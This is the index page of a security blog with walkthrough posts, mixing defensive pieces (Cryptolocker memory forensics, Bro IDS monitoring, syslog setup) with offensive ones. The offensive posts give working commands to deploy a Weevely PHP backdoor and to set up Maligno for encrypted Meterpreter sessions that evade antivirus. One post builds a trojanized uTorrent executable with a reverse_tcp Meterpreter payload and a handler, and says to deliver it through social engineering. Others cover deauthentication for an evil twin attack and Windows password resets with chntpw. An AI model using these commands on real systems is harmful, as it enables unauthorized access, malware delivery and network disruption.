
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Iris Security Labs Blog</title>
  <meta name="author" content="Iris Security Labs">

  
  <meta name="description" content="Recently I&rsquo;ve been finding the need more and more to have a reliable backdoor PHP shell that has a reputable history. From work experience I &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://irissecuritylabs.github.io/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="Iris Security Labs Blog" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-72521344-1']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <img src="../../images/logo.png" style="width:40%;height:40%;">
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="irissecuritylabs.github.io">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/02/27/custom-php-backdoor-shell-with-weevely/">Custom PHP Backdoor Shell With Weevely</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-02-27T14:45:07-05:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>27</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:45 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Recently I&rsquo;ve been finding the need more and more to have a reliable backdoor PHP shell that has a reputable history. From work experience I knew about the classic c99.php backdoor shell and knew that it wasn&rsquo;t the direction I wanted to go in. If you haven&rsquo;t read The Hacker Blog article on it <a href="http://thehackerblog.com/every-c99-php-shell-is-backdoored-aka-free-shells/">here</a>, it&rsquo;s definitely worth a read.</p>

<p>So I came across Weevely. What an awesome little backdoor! Here I&rsquo;m just going to walk through the basic usage of it to get you up and running. This backdoor is definitely the quick and easy way of doing things when pentesting a PHP site.</p>

<ol>
<li><p>Using Kali, Weevely is already built in, we can generate our backdoor with our password to connect to it. My password will be blagger:
         <code>weevely generate blagger sneaky.php</code>
         <img src="../../images/weevely1.png" alt="weevely1" /></p></li>
<li><p>Next, for simplicity sake, I will upload the backdoor to my test web server using SFTP. Of course there are hundreds of other ways to get your PHP script onto a web server, but this is a demo. Because my web server is ran on Amazon&rsquo;s Ec2, I need to remote in using a limited user account. Still I can upload the file to the tmp directory to be moved by root:
         <img src="../../images/weevely2.png" alt="weevely2" /></p></li>
<li><p>Finally, I&rsquo;ll SSH in and move the uploaded backdoor into the public facing web directory to allow access for Weevely to connect. Once it&rsquo;s publicly accessible, browse to it in Weevely and your back door gets executed:
         <code>weevely http://52.0.212.83/sneaky.php blagger</code>
         <img src="../../images/weevely3.png" alt="weevely3" />
         <img src="../../images/weevely4.png" alt="weevely4" /></p></li>
</ol>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/07/01/meterpreter-over-ssl-with-maligno/">Meterpreter Over SSL With Maligno</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2014-07-01T22:20:17-04:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>1</span><span class='date-suffix'>st</span>, <span class='date-year'>2014</span></span> <span class='time'>10:20 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Certain situations require meterpreter sessions to be encrypted to avoid layer 4 detection. This is something I&rsquo;ve desired in the past but never really pursued, until I came across Maligno. Maligno is a platform from which you can launch metasploit payloads via https that are AES encrypted and base64 encoded. The payload to be pushed to the client can also be be encoded numerous times via any Metasploit encoders to avoid layer 7 detection.</p>

<p>This is the process of setting up your server:</p>

<ol>
<li><p>Download and extract Maligno here: <a href="http://www.encripto.no/tools/maligno-1.1.tar.gz">Maligno</a></p></li>
<li><p>Install the prerequisite binaries:</p>

<p><code>sudo apt-get update &amp;&amp; sudo apt-get install python-ipcalc</code></p></li>
<li><p>Generate the self-signed SSL cert to be used on your server:</p>

<p><code>./certgen.sh</code></p></li>
<li><p>Configure server.conf to allow the following:</p>

<ul>
<li><p>Serve 3 different payloads to 3 different targets all over port 443</p></li>
<li><p>Serve via https</p></li>
<li><p>Scope to your network</p></li>
<li><p>Set the server IP to that of the Maligno host</p></li>
</ul>


<p><img src="../../images/maligno-conf.png" alt="maligno-conf" /></p></li>
<li><p>Generate the python scripts for the clients to reach out to Maligno with:</p>

<p><code>python clientgen.py -i 0 -f server.conf -o client1.py
    python clientgen.py -i 1 -f server.conf -o client2.py
    python clientgen.py -i 2 -f server.conf -o client3.py</code></p></li>
<li><p>On a Windows machine, install python2.7, pycrypto and py2exe.</p></li>
<li><p>Generate executables from the python scripts using py2exe for all 3 target clients:</p>

<p><img src="../../images/maligno-bins.png" alt="maligno-bins" /></p></li>
<li><p>Start the Maligno server and the meterpreter handler to listen for incoming connections:</p>

<p><img src="../../images/maligno-start.png" alt="maligno-start" /></p></li>
<li><p>Upon execution of your crafted executables, an encrypted meterpreter session will be opened undetected by antivirus or NIDS:</p>

<p><img src="../../images/maligno-stager.png" alt="maligno-stager" />
    <img src="../../images/maligno-meterpreter.png" alt="maligno-meterpreter" />
    <img src="../../images/maligno-vtresults.png" alt="maligno-vtresults" /></p></li>
</ol>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/01/21/anonymous-content-grabbing-with-python/">Anonymous Content Grabbing With Python</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2014-01-21T21:15:36-05:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2014</span></span> <span class='time'>9:15 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p><img src="../../images/Anonymity.png" alt="Anonymity" /></p>

<p>As a malware analyst, sometimes it&rsquo;s necessary to obtain a sample of a website&rsquo;s source code to manually evaluate any hidden malicious JavaScript. But why give up your IP address and possibly your exact whereabouts just to snoop around?</p>

<p>Fellow analysts, we present to you, our customized python-based anonymous browser, <a href="https://github.com/irissecuritylabs/anonBrowser">anonBrowser.py</a>.</p>

<p>Nothing special, just a quick and dirty little terminal program that pulls a random proxy, emulates a random browser and pulls the specified content using it&rsquo;s forged identity. Written so that it&rsquo;s easy to understand and easy to customize should you like to make changes to it.</p>

<p>Usage: ./anonBrowser.py -s URL</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/01/21/granular-network-security-monitoring-with-bro-ids/">Granular Network Security Monitoring With Bro IDS</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2014-01-21T21:14:09-05:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2014</span></span> <span class='time'>9:14 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p><img src="../../images/Onion.png" alt="Onion" /></p>

<p>If you&rsquo;re a security researcher and haven&rsquo;t kicked the wheels yet of Doug Burks' <a href="https://code.google.com/p/security-onion/">Security Onion</a>, you&rsquo;re missing out on a enormous asset to your security arsenal. The Onion provides complete insight into your network providing you with a full IDS (Intrusion Detection System) and NSM (Network Security Monitoring) capabilities.</p>

<p>One of the greatest tools Security Onion provides is Bro logging. The Security Onion takes less than an hour to setup and configure, but once connected to a network tap and put in &ldquo;promiscuous&rdquo; mode, Bro logging kicks in and begins capturing, logging, and compressing every packet flowing into and out of your network.</p>

<p>Given this visibility sparked me to write a little bash script building off of <a href="http://sketchymoose.blogspot.com/">Sketchymoose&rsquo;s</a> python written URL checker, which uses Virustotal&rsquo;s API to check a large quantity of given URLs for any detections among 51 scanning engines.</p>

<p>The script coupled with the Onion is designed to find any and all domains visited by anyone on the network that end in foreign country codes (.hk .ru .cc &hellip;etc) over the duration of 24 hours at 11:55 pm. These domains are then scanned by Virus Total and those that come back as being malicious are recorded.</p>

<p>An email will then be sent at midnight informing the incident response team which endpoints had visited malicious sites and for how long each connection persisted after the initial connection had been made.</p>

<p>If a connection was made to a known malicious site and the connection lasted dozens of minutes or hours, it can be assumed that the endpoint was more than likely compromised. At this point the endpoint would be further examined and an investigation can be made to determine whether or not any sensitive data was put at risk.</p>

<p>Follow these steps to configure the script.</p>

<ol>
<li><p>Install Security Onion and configure the tap interface to monitor in promiscuous mode.</p></li>
<li><p>Create a directory in the /opt/ folder called URLchecker.</p></li>
<li><p>Inside URLchecker, place <a href="https://github.com/irissecuritylabs/CountryCodeChecker">CountryCodeChecker.sh</a> and both Sketchymoose&rsquo;s scripts, <a href="https://github.com/sketchymoose/UrlCheckerScript/blob/master/urlChecker.py">urlChecker.py</a> and <a href="https://github.com/sketchymoose/UrlCheckerScript/blob/master/parseCheckerFile.py">parseCheckerFile.py</a>.</p></li>
<li><p>Edit urlChecker.py and provide your Virus Total API key (free once you sign up.) Also, be sure to uncomment the timeout.sleep functions if you have a free license. Comment out line 50, 122,126, and 129 to lessen the verbosity of the script. If you encounter errors regarding invalid JSON variables, I fixed this by changing line 121 to <code>if count1 % 4 == 0:</code> and changing my sleep intervals to 30 seconds instead of 15.</p></li>
<li><p>Edit parseCheckerFile.py by changing line 30 to <code>[base:base+4]</code> and line 31 to <code>if "Link: " in l:</code> .</p></li>
<li><p>Make CountryCodeChecker.sh executable with:
<code>sudo chmod u+x CountryCodeChecker.sh
</code></p></li>
<li><p>Follow <a href="http://www.nixtutor.com/linux/send-mail-with-gmail-and-ssmtp/">this tutorial</a> to setup SSMTP to allow cron to email you the script output, Gmail works fine but if you have an internal email server, that should work too.</p></li>
<li><p>To configure cron run crontab -e as root, select nano as your editor, then put in the bottom of your crontab file:
<code>MAILTO=""
55 23 * * * /opt/URLchecker/CountryCodeChecker.sh | /usr/sbin/ssmtp example@gmail.com</code></p></li>
</ol>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/11/11/cryptolocker-analysis-with-volatility/">Cryptolocker Analysis With Volatility</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2013-11-11T19:15:32-05:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>11</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>7:15 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>There&rsquo;s been a lot of hype recently about the new cryptolocker virus going around. Lucky me, I got a copy of it. Ths write-up documents what I found. Upon opening a malicious email sent to the user, <code>7879.tmp.exe</code> made it&rsquo;s way onto the system. This executable spawned two more processes, <code>bcfitawu.exe</code> and <code>Kgvndlyklezfbnr.exe</code>. A full memory dump was acquired using mandiant&rsquo;s tool Redline. A quick run through in Malwr and anubis prouced the following results:</p>

<p><code>7879.tmp.exe</code>:
<a href="https://malwr.com/analysis/Y2UxODQyOWY2ZjljNDk3NDg0M2FhYzkyN2EyZmU4ZWI/">Malwr Results</a>
<a href="http://anubis.iseclab.org/?action=result&amp;task_id=1dd23ed8687660bb4e984999a1b52fa61&amp;format=html">Anubis Results</a></p>

<p><code>bcfitawu.exe:</code>:
<a href="https://malwr.com/analysis/MWIwNWFmY2I0NzY2NDNkNjkxNWY2MTE3NTlmMmVjNjQ/">Malwr Results</a>
<a href="http://anubis.iseclab.org/?action=result&amp;task_id=1f261568f47d256443dd2ababfc184692&amp;format=html">Anubis Results</a></p>

<p><code>Kgvndlyklezfbnr.exe:</code>:
<a href="https://malwr.com/analysis/ZjZkODVkZWZhMzc3NDg0N2EyMjE5OGIxODM5NjcyMjI/">Malwr Results</a>
<a href="http://anubis.iseclab.org/?action=result&amp;task_id=161cda69514dde36401bd893c228a288a&amp;format=html">Anubis Results</a></p>

<p>Next I wanted to examine the behaviour of the malware samples using Volatility.  Kali Linux made this easy by already having Volatility installed. These were the commands I ran:</p>

<ol>
<li><p>Python vol.py -f &lt;image.img> imageinfo</p>

<p>   <img src="../../images/imageinfo1.png" alt="imageinfo" /></p>

<p>   Imageinfo will print out the operating system name and service pack. This is required to run further volatility commands.</p></li>
<li><p>Python vol.py -f &lt;image.img> &ndash;profile=Win7SP1x64 pslist</p>

<p>   <img src="../../images/pslist.png" alt="pslist" /></p>

<p>   Pslist will print out all of the processes along with their PIDs and PPIDs.</p></li>
<li><p>Python vol.py -f &lt;image.img> &ndash;profile=Win7SP1x64 dlldump -pid=<process> id -D ~/Desktop/samples</p>

<p>   <img src="../../images/dlldump.png" alt="dlldump" /></p>

<p>   Dlldump allows you to grab samples of all the dlls used by a particular proccess by specifying the PID and the output directory to drop the dlls to.</p></li>
<li><p><a href="https://www.virustotal.com/en/file/2bff9d483420df2f41c7eba232c6d90853df6acfe9f9b163af5d3495ea082229/analysis/"> VirusTotal Scan Results</a></p>

<p>   <img src="../../images/virustotal.png" alt="VirusTotal" /></p>

<p>   A quick run through VirusTotal tells us these dlls were in fact malicious.</p></li>
<li><p>Python vol.py -f &lt;image.img> &ndash;profile=Win7SP1x64 netscan | grep process name</p>

<p>   <img src="../../images/netscan.png" alt="netscan" /></p>

<p>   Netscan will show you all the connections made by running processes at the time of a memory capture. You can then pipe the output and perform a search by process names. In this scenario, it was apparent that <strong><code>Kgvndlyklezfbnr.exe</code></strong> made a connection to 212.71.250.4. A IPReputation search on that IP then confirmed that the cryptolocker virus had indeed contacted home base:
    <img src="../../images/IPreputation.png" alt="IPReputation" /></p></li>
</ol>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/03/18/rsyslog-vs-syslog-ng/">Rsyslog vs Syslog-ng</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2013-03-18T16:30:51-04:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>4:30 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Ever tried to set-up a central server to manage all of you log aggregation? This post covers my exploration of two key components of just about any centralized logging server.</p>

<p>If you&rsquo;re thinking about setting up remote logging, you will undoubtedly be needing either syslog-ng or rsyslog.
If you&rsquo;ve never had to deal with either of these,it can be a daunting task. So which is better you ask? Well that depends on the level of granularity you&rsquo;re looking for.</p>

<p>For simplicity sake and ease of use, Rsyslog is definitely the better of the two. It&rsquo;s as easy as saying &ldquo;if logs are coming from this ip address send them to this file&rdquo; and that&rsquo;s it. You can do that for all of your sources to have nice and neat organized files:</p>

<p><img src="../../images/203428_326x62_scrot.png" alt="logs" /></p>

<p>Just because it&rsquo;s easy to use doesn&rsquo;t mean it&rsquo;s not versatile. Here are some example filters:
<code>
if $source=='192.168.1.2' and $msg startswith 'ESET' and ($msg contains 'Mom-PC' or $msg contains 'Dad-PC')then /var/log/remote/antivirus.log
if $source=='192.168.1.3' then /var/log/remote/ossec.log
if $source=='192.168.1.4' then /var/log/remote/firewall.log
</code></p>

<p>The beef I have with syslog-ng is the amount of manual labor it takes to setup and configure it properly. Once it&rsquo;s up and running, it works just fine, it&rsquo;s just a cumbersome task. Basically the way syslog-ng works is as follows:</p>

<ol>
<li><p>Specify where logs will be coming from as your &ldquo;sources&rdquo;</p></li>
<li><p>Specify any &ldquo;filter&rdquo; you want to be applied to all of these logs</p></li>
<li><p>Specify the &ldquo;destination&rdquo; to which you want these logs to be sent</p></li>
<li><p>Tell syslog-ng to write the log files, otherwise steps 1-3 just get ignored</p></li>
</ol>


<p>It really is quite the tedious process.</p>

<p>This is what&rsquo;s required to accomplish the same thing rsyslog did in 3 lines (not even including filters):</p>

<p><code>source antivirus { udp(ip(192.168.1.2) port (514)); };
source ossec { udp(ip(192.168.1.3) port (1514); };
source firewall { udp(ip(192.168.1.4) port (514)); };</code></p>

<p><code>destination antivirus { file("/var/log/remote/antivirus.log"); };
destination ossec { file("/var/log/remote/ossec.log"); };
destination firewall { file("/var/log/remote/firewall.log"); };</code></p>

<p><code>log {source(antivirus); destination(antivirus); };
log {source(ossec); destination(ossec); };
log {source(firewall); destination(firewall); };</code></p>

<p>It seems like overkill to me and look at the results I got:</p>

<p><img src="../../images/203428_326x62_scrot.png" alt="logs" /></p>

<p>Look familiar?</p>

<p>Thanks for reading.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/01/07/reset-windows-passwords-using-backtrack/">Reset Windows Passwords Using Backtrack</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2013-01-07T08:16:42-05:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>7</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>8:16 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>This is just a quick and dirty write-up on resetting a &ldquo;forgotten&rdquo; windows password using Linux. Backtrack specifically.</p>

<p>To use this method, we will be using a Backtrack live usb drive. Once you&rsquo;ve downloaded the Backtrack iso and loaded it onto the usb drive (I prefer using unetbootin for this) we&rsquo;re ready to get started.</p>

<p>First boot into Backtrack and open up the file manager. This will show you all the storage devices that Linux has access to. By default Linux will try to mount these devices. The internal hard drives will be mounted as read only.</p>

<p>To unmount the Windows partition, open up the terminal and type:</p>

<p><code>fdisk -l</code></p>

<p>This will list all the partitions on your hard drive, each one will normally be labeled as sda1 or sda2 or something similar.</p>

<p>Next:</p>

<p><code>umount /dev/sda2</code></p>

<p>Now we need to remount this partition to give us read write access to modify the SAM file:</p>

<p><code>mount /dev/sda2 /mnt/</code></p>

<p><img src="../../images/113229_543x286_scrot.png" alt="fdisk -l" /></p>

<p>Navigate to this directory and make sure this is your windows partition. It will contain the Users folder, the Windows folder and others related to the Windows operating system.</p>

<p>To change the passwords we will be using the chntpw program. Navigate to the /pentest/passwords/chntpw directory and enter:</p>

<p><code>./chntpw -i /mnt/Windows/System32/config/SAM</code></p>

<p><img src="../../images/114617_656x121_scrot1.png" alt="chntpw -i" /></p>

<p>This will bring up chntpw in interactive mode. Enter 1 to edit user account passwords. Then specify which user to modify. Now either clear or edit the user&rsquo;s password by entering either 1 or 2:</p>

<p><img src="../../images/114942_566x115_scrot.png" alt="quit chntpw" /></p>

<p>Now enter ! to quit the editor and q to leave chntpw. Make sure you specify yes to write to the newly editted hives.</p>

<p>You should now be able to boot into windows and login without a user password.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2012/12/31/google-hacks-find-anything-you-want/">Google Hacks - Find Anything You Want</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2012-12-31T21:40:14-05:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>31</span><span class='date-suffix'>st</span>, <span class='date-year'>2012</span></span> <span class='time'>9:40 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p><img src="../../images/google_hack.jpg" alt="Google hack" /></p>

<p>Google being the omnipotent entity that it is, provides us with an unlimited wealth of knowledge at our finger tips. Literally anything you could possibly want to know about can be found with the ease of a click. This is pretty well known.</p>

<p>What is not so well known is Google&rsquo;s extensive advances search queries, or &lsquo;google hacks&rsquo;. These google hacks have been around since the birth of Google in 1998. Basically by using small keywords in your search string you can specify any file type, directory listing, or even site specific searches. There are many more search operators I will not cover, these are just a few basic strings that I use on a daily basis.</p>

<h3>Site Specific Searches:</h3>

<p>For many of us especially in Information Security, it is critical to do routine checks on our websites to make sure they have not been compromised. One such a check that I perform regularly is the site search. A common sign of a hacked website is that it is used as a host for parasitic viagra or cialis webpages. To see if you site could be compromised, query:</p>

<p><code>site:yoursite.com cialis or viagra</code></p>

<p>Also, Google accepts using the wildcard symbol, to find non-profit webpages that are currently hacked, query:</p>

<p><code>site:*.org cialis or viagra</code></p>

<h3>File Type Searches:</h3>

<p>This next search string is especially useful for exploiting open directories on the web to find unsecured mp3 files, keep in mind this is for informational purposes only.
Lets examine this search string:</p>

<p><code>?intitle:index.of?mp3 Aerosmith</code></p>

<p>This will search any unsecured directory put online containing only mp3s of the band Aerosmith. This same string can be manipulated to look for pdfs for osint, or whichever file type you have in mind.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2012/12/13/bypass-antivirus-with-shikata-ga-nai-encoder/">Bypass Antivirus With Shikata Ga Nai Encoder</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2012-12-13T11:03:33-05:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>11:03 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Using metasploit, it is possible to combine a meterpreter session with a completely benign executable. That way when a user executes the innocent looking executable, a meterpreter session is opened to a remote machine essentially giving it identical level access to the exploited machine as the user running the binary. ESET&rsquo;s NOD32 in this example will still detect the malicious executable and try to delete it, but a connection will have already been made to the compromised system.</p>

<ol>
<li><p>Choose a template executable, utorrent for example, and download it to the desktop.</p></li>
<li><p>We will setup up the new malicious executable using the reverse_tcp module to allow remote access to the machine by providing an appropriate local IP address and local port for the tcp handler to bind to once executed on the remote machine. The new executable will then be encoded 10 times using shikata ga nai to hide from the antivirus long enough for a meterpreter session to be opened.</p>

<p>Open up msfconsole and enter:</p>

<p><code>use payload/windows/meterpreter/reverse_tcp
    set LHOST 192.168.1.3
    set LPORT 4444
    generate -e x86/shikata_ga_nai -i 10 -x /root/Desktop/uTorrent.exe -k -t exe -f /root/Desktop/uTorrent2.exe</code></p></li>
</ol>


<p><img src="../../images/Payload_setup.png" alt="Payload setup" /></p>

<ol>
<li><p>Now we setup a handler session on metsploit that matches the IP and Port parameters specified in the malicious generated executable.</p>

<p>Open msfconsole again and enter:</p>

<p><code>use exploit/multi/handler
    set LHOST 192.168.1.3
    set LPORT 4444
    exploit</code></p></li>
<li><p>Find a means of getting the encoded executable onto the victim system either by means of sneakernet or social engineering and have the user open it. ESET will present a dialogue box saying that a malicious file has been detected but by the time that the file is detected, a meterpreter session will have already been opened.</p>

<p>As soon as the meterpreter session opens, it is essential to migrate to another process thereby reducing the chance of the session terminating. (to migrate to another process, you must provide the Process ID, not the name):</p>

<p><code>migrate
    ps "process ID"</code></p></li>
</ol>


<p><img src="../../images/Exploited_system.png" alt="Exploited_system" /></p>

<p>And that&rsquo;s about it, even after AV detects your executable and deletes it, you&rsquo;re already in. Thanks for reading.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2012/12/02/disassociation-packets/">Evil Twin Attack: Disassociation Packets</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2012-12-02T13:03:36-05:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>2</span><span class='date-suffix'>nd</span>, <span class='date-year'>2012</span></span> <span class='time'>1:03 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Evil Twin Attack: An attack in which the attacker deauthenticates clients from an access point (AP) then takes it down and puts up a fake AP with an identical SSID to that of the original to intercept and monitor all traffic as a man in the middle.</p>

<p>In this portion of the attack I will mainly be focusing on the deauthentication packets or disassociation frames. The purpose of these deauthentication packets is to knock all the clients off of a wireless network before having them reconnect to the fake AP.</p>

<p>Another purpose for sending deauthentication packets is to observe the tcp handshake between a client and an AP to perform encrypted wifi password cracking. (This won&rsquo;t be covered in this tutorial)</p>

<p>So first you will need to be sure your wireless card supports wireless packet injection. The card I will be using is a Ralink SI-7200ND:</p>

<p><img src="../../images/Ralink.jpg" alt="Ralink 7200ND" /></p>

<p>Next, the linux distro we will be using is Backtrack 5 R3, mainly because it comes prepackaged with all the tools we will need.</p>

<p>Before we can do any packet injections, our network interface card must first be put into monitor mode, so connect to your network and enter:</p>

<p><code>airmon-ng start wlan1</code></p>

<p>This will put your wireless interface card into monitor mode (given you are using wlan1) and  if you now enter ifconfig, you will see a new interface called mon0. We will be using this interface for all of our our commands from here on out.</p>

<p>Now we&rsquo;ll run a test with our new interface to make sure it supports packet injection, enter:</p>

<p><code>aireplay-ng -9 mon0</code></p>

<p><img src="../../images/162728_437x66_scrot.png" alt="Injection Test" /></p>

<p>This should confirm that you have the ability to inject packets and also give you the MAC address of the AP you&rsquo;re targeting for our next step.</p>

<p>Next, we knock everyone off the network, enter:</p>

<p><code>aireplay-ng -0 0 -a 08:EA:44:2C:C5:DO mon0</code></p>

<p>The -0 specifies deauthentication packets, the 0 sends non-stop packets, and the -a specifies the MAC address of the router.</p>

<p>This is what it should look like:</p>

<p><a href="../../images/161320_539x181_scrot.png"><img src="images/161320_539x181_scrot.png" alt="Deauthentication packets" /></a></p>

<p>And here is what happened to our client targets:</p>

<p><a href="../../images/131450_560x148_scrot.png"><img src="images/131450_560x148_scrot.png" alt="Disassociated client" /></a></p>

<p>As for the rest of the Evil Twin Attack, it will be covered in another post.</p>
</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/posts/2">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2015/02/27/custom-php-backdoor-shell-with-weevely/">Custom PHP Backdoor Shell With Weevely</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/07/01/meterpreter-over-ssl-with-maligno/">Meterpreter Over SSL With Maligno</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/01/21/anonymous-content-grabbing-with-python/">Anonymous Content Grabbing With Python</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/01/21/granular-network-security-monitoring-with-bro-ids/">Granular Network Security Monitoring With Bro IDS</a>
      </li>
    
      <li class="post">
        <a href="/blog/2013/11/11/cryptolocker-analysis-with-volatility/">Cryptolocker Analysis With Volatility</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>GitHub Repos</h1>
  <ul id="gh_repos">
    <li class="loading">Status updating...</li>
  </ul>
  
  <a href="https://github.com/irissecuritylabs">@irissecuritylabs</a> on GitHub
  
  <script type="text/javascript">
    $(document).ready(function(){
        if (!window.jXHR){
            var jxhr = document.createElement('script');
            jxhr.type = 'text/javascript';
            jxhr.src = '/javascripts/libs/jXHR.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(jxhr, s);
        }

        github.showRepos({
            user: 'irissecuritylabs',
            count: 0,
            skip_forks: true,
            target: '#gh_repos'
        });
    });
  </script>
  <script src="/javascripts/github.js" type="text/javascript"> </script>
</section>





  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2016 - Iris Security Labs -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  



<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) {return;}
  js = d.createElement(s); js.id = id; js.async = true;
  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>





  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
